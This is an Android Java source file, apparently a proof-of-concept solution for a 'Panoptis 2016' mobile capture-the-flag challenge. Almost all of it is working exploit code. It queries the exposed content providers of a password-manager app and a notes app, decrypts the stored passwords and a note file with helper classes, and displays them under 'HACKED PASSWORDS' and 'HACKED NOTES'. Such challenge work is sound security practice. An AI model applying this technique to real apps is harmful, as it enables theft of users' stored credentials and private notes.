package gr.panoptis.ellak.ellakpanoptis2016;

import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.TextView;

import java.io.FileNotFoundException;
import java.io.InputStream;

/**
 * Created by rkmylo and h3ph4est7s on 25/05/16.
 */
public class MainActivity extends AppCompatActivity {

    private static final String PWDMANAGER_CP_URI =
            "content://com.els.app.pwdmanager.contentprovider/pwds";
    private static final String SAFENOTE_CP_URI =
            "content://com.els.app.safenote/Congratulations.txt";

    private TextView appContent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        appContent = (TextView) findViewById(R.id.textView);
        appContent.setText("--- Panoptis 2016 ---\n");
        appContent.append("--- ELLAK PoC for Mobile Challenge ---\n");
        appContent.append("--- rkmylo & h3ph4est7s ---\n");

        appContent.append("\n[+] ----------------\n");
        appContent.append("[+] HACKED PASSWORDS\n");
        appContent.append("[+] ----------------\n");
        ph4ckPwdManager();
        appContent.append("\n[+] ------------\n");
        appContent.append("[+] HACKED NOTES\n");
        appContent.append("[+] ------------\n");
        ph4ckSafeNote();
    }

    private void ph4ckPwdManager() {
        String[] arrayOfString = { "name", "pwd" };
        Cursor cursor = getContentResolver().query(
                Uri.parse(PWDMANAGER_CP_URI), arrayOfString, null, null, null);
        PwdManagerPh4ker pp = new PwdManagerPh4ker();
        try {
            if (cursor.moveToFirst()) {
                do {
                    String name = cursor.getString(0);
                    String encrypted = cursor.getString(1);
                    String decrypted = pp.ph4ckPass(encrypted);
                    appContent.append("\n[*] Title:     " + name + "\n");
                    appContent.append("    Password:  " + decrypted + "\n");
                } while (cursor.moveToNext());
            }
        }
        catch (NullPointerException exception) {
            exception.printStackTrace();
        }
        finally {
            cursor.close();
        }
    }

    private void ph4ckSafeNote() {
        /*String root_path = this.c.getFilesDir().toString();
        File file = new File("/data/data/");
        File[] arrayOfFile = this.file.listFiles();
        for (int i = 0;; i++) {
            if (i >= arrayOfFile.length) {
                this.ad = new ArrayAdapter(this, 17367043, this.FFList);
                setListAdapter(this.ad);
                return;
            }
            this.FFList.add(arrayOfFile[i].getName());
        }*/
        try {
            Uri singleUri = Uri.parse(SAFENOTE_CP_URI);
            InputStream instream = getContentResolver().openInputStream(singleUri);
            SafeNotePh4ker sn = new SafeNotePh4ker();
            String decrypted = sn.ph4ckNote(instream);
            appContent.append("\n[*] Title:     Congratulations.txt\n");
            appContent.append(decrypted + "\n");
        }
        catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
}
